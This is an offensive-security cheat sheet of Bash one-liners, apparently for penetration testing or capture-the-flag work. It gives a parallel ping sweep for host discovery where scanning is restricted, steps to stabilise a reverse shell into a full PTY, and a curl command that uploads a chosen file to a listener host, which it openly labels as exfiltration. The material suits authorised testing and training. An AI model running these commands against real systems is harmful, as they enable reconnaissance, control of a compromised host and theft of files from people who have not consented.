# Bash

## Bash oneliner

### Ping sweep

Sweep a /24 with one ping each in parallel and print only successful replies. Quick host discovery without nmap, useful when scanning is restricted.

```sh title:"Parallel /24 ping sweep, print only live replies"
for i in {1..254} ;do (ping -c 1 $first_three_octets.$i | grep "bytes from" &) ;done
```
<!-- cheat
var first_three_octets = printf '%s\n' '192.168.1' '10.10.10' '172.16.0' --- --header 'First three octets'
-->

### Stabilize shell

Upgrade a dumb reverse shell to a full PTY using script(1), then background and fix terminal modes so tab completion, ctrl-c, and resizing work.

```sh title:"Upgrade reverse shell to full PTY via script(1)"
/usr/bin/script -qc /bin/bash /dev/null
\# ^Z
\# stty raw -echo; fg; reset
```
<!-- cheat -->

### Curl file upload

POST a local file to a listener with multipart/form-data. Pair with a simple HTTP receiver to exfil one file at a time.

```sh title:"Multipart POST a file to listener for exfil"
curl -F 'file=@$file_to_upload' $lhost
```
<!-- cheat
var file_to_upload
var lhost
-->

